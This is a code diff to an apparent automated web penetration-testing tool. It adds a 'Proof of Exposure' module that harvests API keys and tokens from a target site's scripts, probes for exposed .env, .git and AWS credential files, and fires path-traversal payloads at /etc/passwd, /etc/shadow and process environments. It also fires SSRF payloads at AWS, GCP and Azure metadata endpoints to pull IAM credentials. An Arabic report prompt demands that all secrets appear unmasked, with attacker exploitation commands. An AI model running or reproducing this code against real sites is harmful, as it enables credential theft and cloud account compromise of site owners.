@@ -7416,7 +7416,25 @@ export async function runWebPentest(targetUrl: string): Promise<{
   steps: any[];
   summary: any;
   report: string;
+  developerMessage: string;
+  exposedSecrets: any;
+  deepScan: any;
+  crawler: any;
+  cookieAnalysis: any;
+  domXss: any;
+  wafDetection: any;
+  httpMethods: any;
+  infoDisclosures: any;
+  authWeaknesses: any;
+  exploitGuides: any;
   cipher7: { crypto: C7CryptoFinding[]; aws: C7AWSFinding[]; securityHeaders: any; totalFindings: number; phasesExecuted: number; engineVersion: string };
+  proof_of_exposure: {
+    extracted_plaintext_secrets: { type: string; value: string; source: string }[];
+    exposed_config_files: { path: string; status: number; size: number; rawContent: string; parsedKeys: { key: string; value: string }[] }[];
+    lfi_proof: { url: string; payload: string; rawContent: string; leakType: string }[];
+    ssrf_proof: { url: string; payload: string; provider: string; rawContent: string; credentialsFound: boolean }[];
+    totalExposures: number;
+  };
   generatedAt: string;
   targetUrl: string;
 }> {
@@ -8378,6 +8396,306 @@ if __name__ == "__main__":
     }
   });
 
+  // ═══════════════════════════════════════════════════════════════
+  // PROOF OF EXPOSURE (PoE) & DEEP ASSET DISCOVERY v1.0
+  // Phases 1-4: Active validation of data leakage & misconfigs
+  // ═══════════════════════════════════════════════════════════════
+  interface PoESecret { type: string; value: string; source: string; }
+  interface PoEConfigFile { path: string; status: number; size: number; rawContent: string; parsedKeys: { key: string; value: string }[]; }
+  interface PoELFIResult { url: string; payload: string; rawContent: string; leakType: string; }
+  interface PoESSRFResult { url: string; payload: string; provider: string; rawContent: string; credentialsFound: boolean; }
+  const poeSecrets: PoESecret[] = [];
+  const poeConfigFiles: PoEConfigFile[] = [];
+  const poeLFIResults: PoELFIResult[] = [];
+  const poeSSRFResults: PoESSRFResult[] = [];
+
+  // ═══ PHASE 1: Deep JS & DOM Asset Harvesting (DLP Scanning) ═══
+  const poeSecretPatterns: { type: string; regex: RegExp }[] = [
+    { type: "AWS_ACCESS_KEY", regex: /AKIA[0-9A-Z]{16}/g },
+    { type: "FIREBASE_KEY", regex: /AIza[0-9A-Za-z_-]{33}/g },
+    { type: "STRIPE_KEY", regex: /(sk|pk)_(live|test)_[0-9A-Za-z]{24,}/g },
+    { type: "JWT_TOKEN", regex: /eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g },
+    { type: "AWS_SECRET_KEY", regex: /(?:aws_secret_access_key|AWS_SECRET_ACCESS_KEY|secret_key)\s*[=:]\s*['"]?([A-Za-z0-9/+=]{40})['"]?/g },
+    { type: "BEARER_TOKEN", regex: /(?:bearer|Bearer|BEARER)\s+([A-Za-z0-9_\-.~+/]+=*)/g },
+    { type: "HARDCODED_PASSWORD", regex: /(?:password|passwd|pwd|secret|pass)\s*[:=]\s*['"]([^'"]{6,})['"](?!\s*(?:\+|\.|\[))/gi },
+    { type: "GITHUB_TOKEN", regex: /gh[pousr]_[A-Za-z0-9_]{36,}/g },
+    { type: "SLACK_TOKEN", regex: /xox[bprs]-[0-9]{10,}-[A-Za-z0-9-]+/g },
+    { type: "PRIVATE_KEY", regex: /-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----[\s\S]{20,}?-----END (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/g },
+    { type: "SENDGRID_KEY", regex: /SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}/g },
+    { type: "TWILIO_KEY", regex: /SK[0-9a-fA-F]{32}/g },
+    { type: "MAILGUN_KEY", regex: /key-[0-9a-zA-Z]{32}/g },
+    { type: "HEROKU_API_KEY", regex: /[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}/g },
+    { type: "GOOGLE_OAUTH_SECRET", regex: /GOCSPX-[A-Za-z0-9_-]{28}/g },
+    { type: "OPENAI_KEY", regex: /sk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20}/g },
+    { type: "DATABASE_URL", regex: /(?:mongodb(?:\+srv)?|postgres(?:ql)?|mysql|redis|amqp):\/\/[^\s'"<>]{10,}/g },
+  ];
+
+  const poeJsNoiseValues = new Set(["same-origin", "no-cors", "include", "omit", "no-referrer", "no-cache", "reload", "force-cache", "navigate", "cors", "undefined", "null", "true", "false", "anonymous", "use-credentials"]);
+  function isPoeRealSecret(value: string, type: string): boolean {
+    if (value.length < 6 || poeJsNoiseValues.has(value.toLowerCase())) return false;
+    if (type === "HARDCODED_PASSWORD" && /^(test|example|demo|sample|placeholder|TODO|xxx|password|changeme|your_)$/i.test(value)) return false;
+    if (type === "HEROKU_API_KEY" && /^0{8}-0{4}-0{4}-0{4}-0{12}$/.test(value)) return false;
+    if (/^[a-z]{1,4}$|^[A-Z]{1,4}$|^[0-9]{1,4}$/.test(value)) return false;
+    return true;
+  }
+
+  // Gather all fetchable JS/JSON asset URLs from the page
+  const jsJsonAssetUrls: string[] = [];
+  const assetUrlRegex = /(?:src|href)\s*=\s*["']([^"']+\.(?:js|json|mjs|cjs))["']/gi;
+  let assetMatch: RegExpExecArray | null;
+  while ((assetMatch = assetUrlRegex.exec(webData.html)) !== null) {
+    let u = assetMatch[1];
+    if (u.startsWith("//")) u = "https:" + u;
+    else if (u.startsWith("/")) { try { u = new URL(u, baseUrl).href; } catch { continue; } }
+    else if (!u.startsWith("http")) { try { u = new URL(u, webData.url).href; } catch { continue; } }
+    jsJsonAssetUrls.push(u);
+  }
+  // Also add any discovered .json endpoints from crawled pages
+  for (const ep of allEndpoints) {
+    if (/\.json$/i.test(ep)) jsJsonAssetUrls.push(ep);
+  }
+  const uniqueAssetUrls = [...new Set(jsJsonAssetUrls)].slice(0, 40);
+
+  // Fetch & scan all JS/JSON assets + inline scripts + HTML for plaintext secrets
+  const poePhase1Probes = uniqueAssetUrls.map(async (assetUrl) => {
+    const r = await probeFetch(assetUrl);
+    if (!r || r.status >= 400) return;
+    for (const { type, regex } of poeSecretPatterns) {
+      const re = new RegExp(regex.source, regex.flags);
+      let m: RegExpExecArray | null;
+      while ((m = re.exec(r.body)) !== null) {
+        const val = m[1] || m[0];
+        if (isPoeRealSecret(val, type)) {
+          if (!poeSecrets.some(s => s.value === val && s.type === type)) {
+            poeSecrets.push({ type, value: val, source: assetUrl });
+          }
+        }
+      }
+    }
+  });
+  // Also scan inline scripts + page HTML
+  const poeInlineScanSources = [...webData.scripts.slice(0, 30), webData.html];
+  for (const content of poeInlineScanSources) {
+    for (const { type, regex } of poeSecretPatterns) {
+      const re = new RegExp(regex.source, regex.flags);
+      let m: RegExpExecArray | null;
+      while ((m = re.exec(content)) !== null) {
+        const val = m[1] || m[0];
+        if (isPoeRealSecret(val, type)) {
+          const src = content === webData.html ? webData.url : `${webData.url} (inline script)`;
+          if (!poeSecrets.some(s => s.value === val && s.type === type)) {
+            poeSecrets.push({ type, value: val, source: src });
+          }
+        }
+      }
+    }
+  }
+  // Also scan crawled pages
+  const poeCrawledScanProbes = webData.crawledPages.slice(0, 20).map(async (page) => {
+    if (!page.html || page.html.length < 50) return;
+    for (const { type, regex } of poeSecretPatterns) {
+      const re = new RegExp(regex.source, regex.flags);
+      let m: RegExpExecArray | null;
+      while ((m = re.exec(page.html)) !== null) {
+        const val = m[1] || m[0];
+        if (isPoeRealSecret(val, type)) {
+          if (!poeSecrets.some(s => s.value === val && s.type === type)) {
+            poeSecrets.push({ type, value: val, source: page.url });
+          }
+        }
+      }
+    }
+  });
+
+  // ═══ PHASE 2: Exposed Configuration Bruteforcing ═══
+  const poeConfigPaths = [
+    "/.env", "/api/.env", "/.env.local", "/.env.production", "/.env.backup", "/.env.staging", "/.env.dev",
+    "/.git/config", "/.git/HEAD", "/.gitignore",
+    "/wp-config.php.bak", "/wp-config.php.old", "/wp-config.php.save", "/wp-config.php~",
+    "/config.json", "/config.yml", "/config.yaml", "/config.php", "/config.bak",
+    "/.aws/credentials", "/.aws/config",
+    "/docker-compose.yml", "/docker-compose.yaml", "/Dockerfile",
+    "/application.properties", "/application.yml",
+    "/.npmrc", "/.yarnrc", "/.babelrc",
+    "/composer.json", "/composer.lock",
+    "/package.json", "/package-lock.json",
+    "/appsettings.json", "/appsettings.Development.json",
+    "/web.config", "/settings.py", "/local_settings.py",
+    "/database.yml", "/secrets.yml", "/credentials.yml",
+    "/.htpasswd", "/.htaccess",
+    "/backup.sql", "/dump.sql", "/db.sql",
+    "/phpinfo.php", "/info.php",
+    "/.well-known/security.txt",
+    "/robots.txt", "/sitemap.xml",
+    "/swagger.json", "/openapi.json", "/api-docs",
+  ];
+  const poeConfigKVRegex = /^([A-Z_][A-Z0-9_]*)\s*=\s*(.+)$/gm;
+  const poeConfigSensitivePatterns = /(?:PASSWORD|SECRET|KEY|TOKEN|CREDENTIAL|DATABASE_URL|DB_|MONGO|REDIS|SMTP|AWS_|API_KEY|PRIVATE|AUTH|SESSION|SALT|HASH|ENCRYPTION|MASTER|ROOT_|ADMIN_|ACCESS_|REFRESH_)/i;
+
+  const poePhase2Probes = poeConfigPaths.map(async (cfgPath) => {
+    const fullUrl = baseUrl + cfgPath;
+    const r = await probeFetch(fullUrl);
+    if (!r || r.status !== 200 || r.body.length < 10) return;
+    // Skip HTML error pages
+    if (/<!DOCTYPE|<html|<head|<body/i.test(r.body.slice(0, 200)) && !cfgPath.endsWith(".json") && !cfgPath.endsWith(".xml")) return;
+    const parsed: { key: string; value: string }[] = [];
+    const kvRegex = /^([A-Z_][A-Z0-9_]*)\s*=\s*["']?([^\n"']+)["']?\s*$/gm;
+    let kvMatch: RegExpExecArray | null;
+    while ((kvMatch = kvRegex.exec(r.body)) !== null) {
+      parsed.push({ key: kvMatch[1], value: kvMatch[2].trim() });
+    }
+    // For JSON files, parse and extract keys
+    if (cfgPath.endsWith(".json")) {
+      try {
+        const jsonObj = JSON.parse(r.body);
+        const extractJsonKeys = (obj: Record<string, unknown>, prefix = ""): void => {
+          for (const [k, v] of Object.entries(obj)) {
+            const fullKey = prefix ? `${prefix}.${k}` : k;
+            if (typeof v === "string" && v.length > 0 && poeConfigSensitivePatterns.test(fullKey)) {
+              parsed.push({ key: fullKey, value: v });
+            } else if (typeof v === "object" && v !== null && !Array.isArray(v)) {
+              extractJsonKeys(v as Record<string, unknown>, fullKey);
+            }
+          }
+        };
+        extractJsonKeys(jsonObj);
+      } catch {}
+    }
+    // For YAML files, basic key-value extraction
+    if (cfgPath.endsWith(".yml") || cfgPath.endsWith(".yaml")) {
+      const yamlKvRegex = /^(\s*)([a-zA-Z_][a-zA-Z0-9_]*)\s*:\s*["']?([^\n"'#]+)["']?\s*$/gm;
+      let ym: RegExpExecArray | null;
+      while ((ym = yamlKvRegex.exec(r.body)) !== null) {
+        if (poeConfigSensitivePatterns.test(ym[2])) {
+          parsed.push({ key: ym[2], value: ym[3].trim() });
+        }
+      }
+    }
+    const hasSensitiveContent = parsed.some(p => poeConfigSensitivePatterns.test(p.key)) || poeConfigKVRegex.test(r.body);
+    if (parsed.length > 0 || hasSensitiveContent) {
+      poeConfigFiles.push({ path: cfgPath, status: r.status, size: r.body.length, rawContent: r.body.slice(0, 5000), parsedKeys: parsed });
+      // Also add sensitive parsed keys to poeSecrets
+      for (const p of parsed) {
+        if (poeConfigSensitivePatterns.test(p.key) && p.value.length >= 4 && !poeSecrets.some(s => s.value === p.value)) {
+          poeSecrets.push({ type: p.key, value: p.value, source: `${fullUrl} (config file)` });
+        }
+      }
+      vulnResults.push({ type: "Exposed Configuration File", severity: "critical", url: fullUrl, payload: cfgPath, evidence: `ملف تكوين مكشوف بـ ${parsed.length} مفتاح حساس — ${r.body.length} bytes`, exploitable: true });
+    }
+  });
+
+  // ═══ PHASE 3: Path Traversal & LFI PoE Validation ═══
+  const poeLFIPayloads = [
+    { payload: "../../../../../../../../etc/passwd", indicator: /root:x:0:0:|root:.*:0:0/i, leakType: "System Passwd" },
+    { payload: "../../../../../../../../etc/shadow", indicator: /root:\$|root:\*|root:!/i, leakType: "System Shadow" },
+    { payload: "../../../../../../../../etc/hosts", indicator: /127\.0\.0\.1\s+localhost/i, leakType: "System Hosts" },
+    { payload: "../../../../../../../../var/www/html/.env", indicator: /^[A-Z_]+=.+$/m, leakType: "Environment Variables" },
+    { payload: "../../../../../../../../proc/self/environ", indicator: /PATH=|HOME=|USER=/i, leakType: "Process Environment" },
+    { payload: "../../../../../../../../var/log/apache2/access.log", indicator: /GET\s+\/|POST\s+\/|HTTP\/1/i, leakType: "Apache Access Log" },
+    { payload: "....//....//....//....//etc/passwd", indicator: /root:x:0:0:|root:.*:0:0/i, leakType: "System Passwd (bypass)" },
+    { payload: "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", indicator: /root:x:0:0:|root:.*:0:0/i, leakType: "System Passwd (url-encoded)" },
+    { payload: "..%252f..%252f..%252f..%252fetc%252fpasswd", indicator: /root:x:0:0:|root:.*:0:0/i, leakType: "System Passwd (double-encoded)" },
+    { payload: "../../../../../../../../var/www/.env", indicator: /DB_PASSWORD|SECRET_KEY|API_KEY|APP_KEY/i, leakType: "App Environment (.env)" },
+    { payload: "../../../../../../../../app/.env", indicator: /DB_PASSWORD|SECRET_KEY|API_KEY|APP_KEY/i, leakType: "App Environment (.env)" },
+  ];
+  // Targets: parameters that accept file paths
+  const poeLFITargets = [
+    ...apiEndpoints.filter(u => /\?/.test(u) && /file|page|path|doc|template|include|load|read|view|display|lang|dir|name|module|content/i.test(u)).slice(0, 8),
+    ...webData.allForms.filter(f => f.inputs.some(i => /file|page|path|doc|template|include|load|dir|name|content|lang/i.test(i.name))).map(f => f.action).slice(0, 5),
+  ];
+  const poeLFIProbes = [...new Set(poeLFITargets)].flatMap(url =>
+    poeLFIPayloads.map(async ({ payload, indicator, leakType }) => {
+      const testUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`) : `${url}?file=${encodeURIComponent(payload)}`;
+      const r = await probeFetch(testUrl);
+      if (r && indicator.test(r.body)) {
+        // Verify it's not a generic error page containing the keyword
+        if (r.body.length > 50 && !/<!DOCTYPE html|<html.*<head.*<title.*error/is.test(r.body.slice(0, 500))) {
+          poeLFIResults.push({ url: testUrl, payload, rawContent: r.body.slice(0, 5000), leakType });
+          // Also add env vars found via LFI to poeSecrets
+          if (leakType.includes("Environment")) {
+            const envKvRegex = /^([A-Z_][A-Z0-9_]*)\s*=\s*["']?([^\n"']+)["']?\s*$/gm;
+            let em: RegExpExecArray | null;
+            while ((em = envKvRegex.exec(r.body)) !== null) {
+              if (poeConfigSensitivePatterns.test(em[1]) && em[2].length >= 4) {
+                if (!poeSecrets.some(s => s.value === em![2].trim())) {
+                  poeSecrets.push({ type: em[1], value: em[2].trim(), source: `${testUrl} (LFI)` });
+                }
+              }
+            }
+          }
+          vulnResults.push({ type: `LFI PoE (${leakType})`, severity: "critical", url: testUrl, payload, evidence: `تم تأكيد تسريب ${leakType} — ${r.body.length} bytes محتوى خام`, exploitable: true });
+        }
+      }
+    })
+  );
+
+  // ═══ PHASE 4: Cloud Metadata SSRF Validation ═══
+  const poeSSRFPayloads = [
+    { payload: "http://169.254.169.254/latest/meta-data/", provider: "AWS", indicator: /ami-id|instance-id|iam|security-credentials|hostname|public-ipv4|local-ipv4/i, credCheck: /AccessKeyId|SecretAccessKey|Token/i },
+    { payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", provider: "AWS IAM", indicator: /AccessKeyId|SecretAccessKey|Token|Expiration|Code.*Success/i, credCheck: /AccessKeyId|SecretAccessKey/i },
+    { payload: "http://169.254.169.254/latest/dynamic/instance-identity/document", provider: "AWS Identity", indicator: /instanceId|accountId|region|imageId/i, credCheck: /accountId/i },
+    { payload: "http://169.254.169.254/latest/user-data", provider: "AWS UserData", indicator: /#!/i, credCheck: /password|secret|key|token/i },
+    { payload: "http://metadata.google.internal/computeMetadata/v1/?recursive=true", provider: "GCP", indicator: /project|attributes|hostname|instance|zone/i, credCheck: /access_token|token_type/i },
+    { payload: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", provider: "GCP Token", indicator: /access_token|token_type|expires_in/i, credCheck: /access_token/i },
+    { payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", provider: "Azure IMDS", indicator: /vmId|name|location|resourceGroup|subscriptionId/i, credCheck: /subscriptionId|tenantId/i },
+    { payload: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", provider: "Azure Token", indicator: /access_token|token_type|expires_on/i, credCheck: /access_token/i },
+  ];
+  const poeSSRFTargets = [
+    ...apiEndpoints.filter(u => /\/fetch|\/proxy|\/url|\/link|\/callback|\/webhook|\/preview|\/render|\/curl|\/get|\/load|\/request|\/navigate|\/download|\/image|\/import/i.test(u)).slice(0, 8),
+    ...webData.allForms.filter(f => f.inputs.some(i => /url|link|src|href|callback|webhook|fetch|proxy|redirect|target|site|endpoint|uri|path|resource|feed|import|file/i.test(i.name))).map(f => f.action).slice(0, 5),
+  ];
+  const poeSSRFProbes = [...new Set(poeSSRFTargets)].flatMap(url =>
+    poeSSRFPayloads.map(async ({ payload, provider, indicator, credCheck }) => {
+      const testUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`) : `${url}?url=${encodeURIComponent(payload)}`;
+      const r = await probeFetch(testUrl, { timeoutMs: 10_000 });
+      if (r && indicator.test(r.body)) {
+        const hasCreds = credCheck.test(r.body);
+        poeSSRFResults.push({ url: testUrl, payload, provider, rawContent: r.body.slice(0, 5000), credentialsFound: hasCreds });
+        // Extract cloud credentials if found
+        if (hasCreds) {
+          try {
+            const jsonBlock = JSON.parse(r.body);
+            if (jsonBlock.AccessKeyId) poeSecrets.push({ type: "AWS_STS_ACCESS_KEY", value: jsonBlock.AccessKeyId, source: `${testUrl} (SSRF)` });
+            if (jsonBlock.SecretAccessKey) poeSecrets.push({ type: "AWS_STS_SECRET_KEY", value: jsonBlock.SecretAccessKey, source: `${testUrl} (SSRF)` });
+            if (jsonBlock.Token) poeSecrets.push({ type: "AWS_STS_SESSION_TOKEN", value: String(jsonBlock.Token).slice(0, 200), source: `${testUrl} (SSRF)` });
+            if (jsonBlock.access_token) poeSecrets.push({ type: `${provider}_ACCESS_TOKEN`, value: String(jsonBlock.access_token).slice(0, 200), source: `${testUrl} (SSRF)` });
+          } catch {
+            // Not JSON, try regex extraction
+            const akMatch = r.body.match(/"AccessKeyId"\s*:\s*"([^"]+)"/);
+            if (akMatch) poeSecrets.push({ type: "AWS_STS_ACCESS_KEY", value: akMatch[1], source: `${testUrl} (SSRF)` });
+            const skMatch = r.body.match(/"SecretAccessKey"\s*:\s*"([^"]+)"/);
+            if (skMatch) poeSecrets.push({ type: "AWS_STS_SECRET_KEY", value: skMatch[1], source: `${testUrl} (SSRF)` });
+            const tokenMatch = r.body.match(/"access_token"\s*:\s*"([^"]+)"/);
+            if (tokenMatch) poeSecrets.push({ type: `${provider}_ACCESS_TOKEN`, value: tokenMatch[1].slice(0, 200), source: `${testUrl} (SSRF)` });
+          }
+        }
+        vulnResults.push({ type: `SSRF PoE (${provider})`, severity: "critical", url: testUrl, payload, evidence: `تم تأكيد ${provider} Metadata — ${hasCreds ? "تم استخراج بيانات الاعتماد!" : "بيانات وصفية مكشوفة"} — ${r.body.length} bytes`, exploitable: true });
+      }
+    })
+  );
+  // Follow-up: if AWS IAM role name discovered, fetch its credentials
+  const poeSSRFFollowUp = [...new Set(poeSSRFTargets)].slice(0, 3).map(async (url) => {
+    // First get the IAM role name
+    const roleUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent("http://169.254.169.254/latest/meta-data/iam/security-credentials/")}`) : `${url}?url=${encodeURIComponent("http://169.254.169.254/latest/meta-data/iam/security-credentials/")}`;
+    const roleResp = await probeFetch(roleUrl, { timeoutMs: 10_000 });
+    if (roleResp && roleResp.status === 200 && roleResp.body.trim().length > 0 && !/<html|<!DOCTYPE/i.test(roleResp.body)) {
+      const roleName = roleResp.body.trim().split("\n")[0].trim();
+      if (roleName && /^[a-zA-Z0-9_+=,.@-]+$/.test(roleName)) {
+        const credUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent(`http://169.254.169.254/latest/meta-data/iam/security-credentials/${roleName}`)}`) : `${url}?url=${encodeURIComponent(`http://169.254.169.254/latest/meta-data/iam/security-credentials/${roleName}`)}`;
+        const credResp = await probeFetch(credUrl, { timeoutMs: 10_000 });
+        if (credResp && /AccessKeyId|SecretAccessKey/i.test(credResp.body)) {
+          poeSSRFResults.push({ url: credUrl, payload: `IAM Role: ${roleName}`, provider: "AWS IAM Credentials", rawContent: credResp.body.slice(0, 5000), credentialsFound: true });
+          try {
+            const creds = JSON.parse(credResp.body);
+            if (creds.AccessKeyId) poeSecrets.push({ type: "AWS_STS_ACCESS_KEY", value: creds.AccessKeyId, source: `${credUrl} (SSRF IAM: ${roleName})` });
+            if (creds.SecretAccessKey) poeSecrets.push({ type: "AWS_STS_SECRET_KEY", value: creds.SecretAccessKey, source: `${credUrl} (SSRF IAM: ${roleName})` });
+            if (creds.Token) poeSecrets.push({ type: "AWS_STS_SESSION_TOKEN", value: String(creds.Token).slice(0, 200), source: `${credUrl} (SSRF IAM: ${roleName})` });
+          } catch {}
+        }
+      }
+    }
+  });
+
   // ═══ RUN ALL PROBES IN PARALLEL ═══
   await Promise.allSettled([
     ...sqliProbes, ...formSqliProbes, ...blindSqliProbes, ...timeSqliProbes,
@@ -8387,6 +8705,9 @@ if __name__ == "__main__":
     ...subdomainProbes, ...crlfProbes,
     ...httpMethodProbes, ...errorProbes,
     ...authProbes, ...rateLimitProbes,
+    ...poePhase1Probes, ...poeCrawledScanProbes,
+    ...poePhase2Probes, ...poeLFIProbes,
+    ...poeSSRFProbes, ...poeSSRFFollowUp,
   ]);
 
   // ═══ UPDATE RISK SCORE ═══
@@ -8401,6 +8722,12 @@ if __name__ == "__main__":
   riskScore += httpMethodResults.filter(m => m.sensitive).length * 5;
   riskScore += infoDisclosures.length * 5;
   riskScore += authWeaknesses.length * 10;
+  // PoE risk scoring
+  riskScore += poeSecrets.length * 3;
+  riskScore += poeConfigFiles.length * 15;
+  riskScore += poeLFIResults.length * 20;
+  riskScore += poeSSRFResults.filter(r => r.credentialsFound).length * 25;
+  riskScore += poeSSRFResults.filter(r => !r.credentialsFound).length * 15;
   if (webData.wafDetected) riskScore = Math.max(0, riskScore - 5); // WAF slightly reduces risk
   riskScore = Math.min(100, riskScore);
 
@@ -9387,9 +9714,74 @@ if __name__ == "__main__":
         `wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -d "username=admin&password=FUZZ" --hc 403,401 ${baseUrl}/login`,
       ],
     },
+    // ═══ PROOF OF EXPOSURE (PoE) — Deep Asset Discovery ═══
+    {
+      id: 26, title: "Cipher-7: إثبات التعرض — Proof of Exposure (PoE)",
+      details: `${poeSecrets.length} سر مستخرج نص صريح — ${poeConfigFiles.length} ملف تكوين مكشوف — ${poeLFIResults.length} تسريب LFI — ${poeSSRFResults.length} SSRF مؤكد`,
+      status: (poeSecrets.length > 0 || poeConfigFiles.length > 0 || poeLFIResults.length > 0 || poeSSRFResults.length > 0) ? "danger" as const : "success" as const,
+      findings: [
+        `╔══════════════════════════════════════════════════════════════╗`,
+        `║   PROOF OF EXPOSURE — إثبات التعرض الفعلي v1.0             ║`,
+        `╚══════════════════════════════════════════════════════════════╝`,
+        ``,
+        `═══ المرحلة 1: استخراج الأسرار من JS/DOM (DLP Scanning) ═══`,
+        `📂 الملفات المفحوصة: ${uniqueAssetUrls.length} JS/JSON + ${webData.scripts.length} سكريبت مضمّن + ${webData.crawledPages.length} صفحة`,
+        `🔑 الأسرار المكتشفة (نص صريح): ${poeSecrets.filter(s => !s.source.includes("config file") && !s.source.includes("LFI") && !s.source.includes("SSRF")).length}`,
+        ...poeSecrets.filter(s => !s.source.includes("config file") && !s.source.includes("LFI") && !s.source.includes("SSRF")).map(s =>
+          `   🔴 [${s.type}] ${s.value}\n      المصدر: ${s.source}`
+        ),
+        poeSecrets.filter(s => !s.source.includes("config file") && !s.source.includes("LFI") && !s.source.includes("SSRF")).length === 0 ? `   ✅ لم يتم العثور على أسرار مكشوفة في ملفات JS/DOM` : "",
+        ``,
+        `═══ المرحلة 2: ملفات التكوين المكشوفة (Configuration Bruteforce) ═══`,
+        `🔍 المسارات المفحوصة: ${poeConfigPaths.length}`,
+        `📁 الملفات المكشوفة: ${poeConfigFiles.length}`,
+        ...poeConfigFiles.map(cf => [
+          `   🔴 [CRITICAL] ${cf.path} — ${cf.size} bytes — HTTP ${cf.status}`,
+          `      المفاتيح الحساسة (${cf.parsedKeys.length}):`,
+          ...cf.parsedKeys.slice(0, 20).map(k => `         ${k.key} = ${k.value}`),
+          cf.parsedKeys.length > 20 ? `         ... و ${cf.parsedKeys.length - 20} مفتاح آخر` : "",
+        ]).flat(),
+        poeConfigFiles.length === 0 ? `   ✅ لم يتم العثور على ملفات تكوين مكشوفة` : "",
+        ``,
+        `═══ المرحلة 3: إثبات تسريب LFI (Path Traversal PoE) ═══`,
+        `🎯 المعاملات المفحوصة: ${poeLFITargets.length}`,
+        `💀 التسريبات المؤكدة: ${poeLFIResults.length}`,
+        ...poeLFIResults.map(r => [
+          `   🔴 [CRITICAL] ${r.leakType} — ${r.url}`,
+          `      الحمولة: ${r.payload}`,
+          `      المحتوى المسرّب (أول 500 حرف):`,
+          `      ${r.rawContent.slice(0, 500).replace(/\n/g, "\n      ")}`,
+        ]).flat(),
+        poeLFIResults.length === 0 ? `   ✅ لم يتم تأكيد تسريبات LFI` : "",
+        ``,
+        `═══ المرحلة 4: إثبات SSRF — بيانات السحابة (Cloud Metadata) ═══`,
+        `🎯 النقاط المفحوصة: ${poeSSRFTargets.length}`,
+        `☁️ SSRF مؤكد: ${poeSSRFResults.length}`,
+        `🔐 بيانات اعتماد مستخرجة: ${poeSSRFResults.filter(r => r.credentialsFound).length}`,
+        ...poeSSRFResults.map(r => [
+          `   🔴 [CRITICAL] ${r.provider} — ${r.url}`,
+          `      ${r.credentialsFound ? "💀 تم استخراج بيانات الاعتماد!" : "⚠️ بيانات وصفية مكشوفة"}`,
+          `      المحتوى الخام (أول 500 حرف):`,
+          `      ${r.rawContent.slice(0, 500).replace(/\n/g, "\n      ")}`,
+        ]).flat(),
+        poeSSRFResults.length === 0 ? `   ✅ لم يتم تأكيد ثغرات SSRF` : "",
+        ``,
+        `═══ الملخص: إجمالي إثبات التعرض ═══`,
+        `   📊 إجمالي الأسرار المستخرجة (نص صريح): ${poeSecrets.length}`,
+        `   📁 ملفات تكوين مكشوفة: ${poeConfigFiles.length}`,
+        `   💀 تسريبات LFI مؤكدة: ${poeLFIResults.length}`,
+        `   ☁️ SSRF مع بيانات اعتماد: ${poeSSRFResults.filter(r => r.credentialsFound).length}`,
+      ].filter(Boolean),
+      commands: [
+        `curl -s "${baseUrl}/.env" 2>/dev/null | head -50`,
+        `curl -s "${baseUrl}/.git/config" 2>/dev/null`,
+        `curl -s "${baseUrl}/config.json" 2>/dev/null | python3 -m json.tool`,
+        `for f in .env .env.local .env.production .git/config wp-config.php.bak; do echo "=== $f ===" && curl -s "${baseUrl}/$f" | head -20; done`,
+      ],
+    },
     // ═══ EXPLOITATION GUIDES (one step per secret type) ═══
     ...exploitGuides.map((guide, idx) => ({
-      id: 26 + idx,
+      id: 27 + idx,
       title: `دليل الاستغلال: ${guide.secretType}`,
       details: guide.description,
       status: "danger" as const,
@@ -9487,6 +9879,16 @@ ${awsSecretsListing || "لا يوجد"}
 - نماذج مكتشفة: ${webData.allForms.length}
 ${vulnResults.map(v => `  [${v.severity.toUpperCase()}] ${v.type}: ${v.url} — Payload: ${v.payload}`).join("\n")}
 
+نتائج إثبات التعرض (Proof of Exposure — PoE):
+- أسرار مستخرجة نص صريح: ${poeSecrets.length}
+${poeSecrets.slice(0, 15).map(s => `  [${s.type}] ${s.value} — المصدر: ${s.source}`).join("\n")}
+- ملفات تكوين مكشوفة: ${poeConfigFiles.length}
+${poeConfigFiles.map(cf => `  ${cf.path} — ${cf.parsedKeys.length} مفتاح حساس — ${cf.size} bytes`).join("\n")}
+- تسريبات LFI مؤكدة: ${poeLFIResults.length}
+${poeLFIResults.map(r => `  ${r.leakType}: ${r.url}`).join("\n")}
+- SSRF مع بيانات اعتماد سحابية: ${poeSSRFResults.filter(r => r.credentialsFound).length}
+${poeSSRFResults.map(r => `  ${r.provider}: ${r.credentialsFound ? "بيانات اعتماد مستخرجة" : "بيانات وصفية فقط"}`).join("\n")}
+
 اكتب تقريراً يشمل:
 1. ملخص تنفيذي
 2. الثغرات الحرجة مع التفاصيل التقنية
@@ -9500,14 +9902,16 @@ ${vulnResults.map(v => `  [${v.severity.toUpperCase()}] ${v.type}: ${v.url} — 
 10. نتائج كشف WAF
 11. جميع الأسرار والمفاتيح المكتشفة مكتوبة بالكامل بدون أي تشفير أو إخفاء
 12. لكل سر مكتشف: اشرح خطوات الاستغلال العملية التي يقوم بها المخترق + الأوامر الفعلية
-9. توصيات الإصلاح بالأولوية
-10. خلاصة المخاطر
+13. إثبات التعرض (Proof of Exposure): اعرض جميع الأسرار المستخرجة من ملفات JS وملفات التكوين المكشوفة وتسريبات LFI وبيانات SSRF — نص صريح بدون إخفاء
+14. توصيات الإصلاح بالأولوية
+15. خلاصة المخاطر
 
 هام جداً: اكتب قسماً خاصاً بعنوان "رسالة إلى المبرمج/المطوّر" موجّهة لمطوّر الموقع تشرح فيها:
 - ما هي الأسرار والمفاتيح التي تم اكتشافها (اذكرها كاملة بدون أي تشفير أو إخفاء)
